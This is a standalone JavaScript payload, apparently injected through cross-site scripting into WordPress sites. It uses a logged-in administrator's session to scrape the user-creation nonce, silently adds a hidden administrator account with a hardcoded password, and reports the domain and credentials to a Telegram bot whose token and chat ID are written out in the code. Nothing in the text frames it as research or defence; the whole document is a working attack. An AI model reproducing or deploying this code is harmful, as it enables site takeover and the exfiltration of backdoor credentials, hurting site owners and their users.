(function() {
    const BOT_TOKEN = '8048897577:AAHCx8N3nDrgo6eS2Kqf6Bdu-nEHluY9YQk';
    const CHAT_ID = '-5011653651';
    const USERNAME = 'site_admin';
    const PASSWORD = 'PtXe*JMQ%jT2HS!BSRc4a$$^';
    
    const notifiedKey = 'xss_notified_' + window.location.hostname;
    if (localStorage.getItem(notifiedKey)) return;
    
    async function sendTelegram(msg) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                body: new URLSearchParams({
                    chat_id: CHAT_ID,
                    parse_mode: 'Markdown',
                    text: msg
                })
            });
        } catch (e) {}
    }
    
    async function createAdmin() {
        try {
            const pageRes = await fetch('/wp-admin/user-new.php', {
                method: 'GET',
                credentials: 'include'
            });
            if (!pageRes.ok) return false;
            
            const pageHtml = await pageRes.text();
            const nonceMatch = pageHtml.match(/name="_wpnonce_create-user"\s+value="([^"]+)"/);
            if (!nonceMatch) return false;
            
            const formData = new FormData();
            formData.append('action', 'createuser');
            formData.append('_wpnonce_create-user', nonceMatch[1]);
            formData.append('_wp_http_referer', '/wp-admin/user-new.php');
            formData.append('user_login', USERNAME);
            formData.append('email', USERNAME + '@' + window.location.hostname);
            formData.append('pass1', PASSWORD);
            formData.append('pass2', PASSWORD);
            formData.append('role', 'administrator');
            formData.append('createuser', 'Add New User');
            
            const userRes = await fetch('/wp-admin/user-new.php', {
                method: 'POST',
                credentials: 'include',
                headers: { 'Referer': window.location.origin + '/wp-admin/user-new.php' },
                body: formData
            });
            
            const responseText = await userRes.text();
            const success = userRes.ok && (
                responseText.includes('User added') || 
                responseText.includes('用户已添加') || 
                responseText.includes('update=add')
            );
            
            if (success) {
                const msg = `✅ *Admin Created*\n🌍 Domain: \`${window.location.hostname}\`\n🔗 URL: \`${window.location.href}\`\n👤 Username: \`${USERNAME}\`\n🔑 Password: \`${PASSWORD}\`\n🕒 Time: \`${new Date().toLocaleString()}\``;
                await sendTelegram(msg);
                localStorage.setItem(notifiedKey, '1');
            }
            
            return success;
        } catch (e) {
            return false;
        }
    }
    
    setTimeout(createAdmin, 1000);
})();

